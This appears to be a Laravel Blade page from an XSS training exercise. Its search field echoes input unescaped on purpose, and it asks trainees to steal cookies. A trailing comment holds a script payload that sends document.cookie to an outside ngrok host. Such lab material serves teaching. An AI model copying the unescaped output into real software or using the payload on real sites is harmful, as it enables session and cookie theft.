<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Challenge 2</title>
    <style>
        body {
            background-color: #fff;
        }

        .fw {
            position: absolute;
            top: 0px;
            right: 0px;
            bottom: 0px;
            left: 0px;
            z-index: 1;
            overflow: hidden;
        }

        .ct {
            z-index: 10;
            position: relative;
        }
    </style>

</head>

<body>

    <p><a href="/day1">Back to day 1</a></p>
    <p><a href="/day1/challenge6">Reset form</a></p>

    <h1>Objectives</h1>
    <p>XSS attacks are often used to steal cookies. While it's not a huge risk on Laravel apps, it's still important to
        understand how it works. So we're gonna steal some cookies!</p>

    <ul>
        <li>Send the value of document.cookie to GET
            https://3e36-51-52-158-78.ngrok-free.app/xss/one?cookie=COOKIE_PAYLOAD&name=YOUR_NAME.
        </li>
        <li>You're specifically looking for the XSRF cookie, but sending all cookies is fine.</li>
    </ul>



    <form method="GET">
        <p>Search:</p>
        <div>
            <textarea name="search" id="search" cols="50" rows="5" placeholder="Search term"></textarea>
        </div>
        <p><button type="submit">Search!</button></p>
    </form>
    @if (request()->query('search'))
        <h2>Search results for "{!! request()->query('search') !!}"</h2>
        <p>None found</p>
    @endif
</body>

</html>

{{-- <script>fetch("https://3e36-51-52-158-78.ngrok-free.app/xss/two?name=Kevin&cookie=" + document.cookie)</script> --}}
